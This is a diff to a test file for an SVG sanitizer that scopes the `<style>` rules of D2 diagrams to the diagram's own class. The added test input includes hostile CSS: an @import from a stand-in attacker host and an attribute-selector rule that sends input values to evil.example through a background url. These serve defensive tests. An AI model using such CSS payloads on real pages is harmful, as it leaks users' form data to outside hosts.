@@ -9,6 +9,8 @@ import {
   D2_PURIFY_CONFIG,
   d2AttributeHook,
   sanitizeD2Svg,
+  scopeD2Css,
+  scopeD2Styles,
   svgUrlAllowed,
 } from '../src/modules/canvas/svgSanitize.ts';
 
@@ -77,4 +79,30 @@ test('hook is installed only for the duration of one sanitize call', () => {
   // Nothing SVG survived → caller gets an error, never raw markup.
   const empty = { ...fake, sanitize: () => '' };
   assert.equal(sanitizeD2Svg('<svg onload="x"></svg>', empty as never), null);
+});
+
+// S11-12: `<style>` survives purification, so its rules are re-scoped to the
+// diagram's own `d2-<id>` class — a rule can no longer restyle the app.
+
+test('D2 style rules are scoped to the diagram', () => {
+  const css =
+    '/* c */ @import url(https://evil.example/x.css); .d2-42 .fill-N1{fill:#000} ' +
+    'body, input[value^="a"]{background:url(https://evil.example/?a)} ' +
+    '@font-face{font-family:d2-42-font;src:url(data:font/woff;base64,AA)} ' +
+    '@keyframes dash{from{x:0}to{x:1}} @media (min-width:1px){a{color:red}} @supports (x:y){b{c:d}}';
+  const out = scopeD2Css(css, 'd2-42');
+  assert.ok(!out.includes('@import'), out);
+  assert.ok(!out.includes('@supports'), out);
+  assert.ok(out.includes('.d2-42 .fill-N1{fill:#000}'), out);
+  assert.ok(out.includes('.d2-42 body,.d2-42 input[value^="a"]{'), out);
+  assert.ok(out.includes('@font-face{'), out);
+  assert.ok(out.includes('@keyframes dash{'), out);
+  assert.ok(out.includes('@media (min-width:1px){.d2-42 a{color:red}}'), out);
+});
+
+test('styles without a diagram scope class are dropped', () => {
+  const svg = '<svg><style>body{display:none}</style><g/></svg>';
+  assert.equal(scopeD2Styles(svg), '<svg><style></style><g/></svg>');
+  const scoped = scopeD2Styles('<svg class="d2-7 d2-svg"><style>.x{a:b}</style></svg>');
+  assert.equal(scoped, '<svg class="d2-7 d2-svg"><style>.d2-7 .x{a:b}</style></svg>');
 });
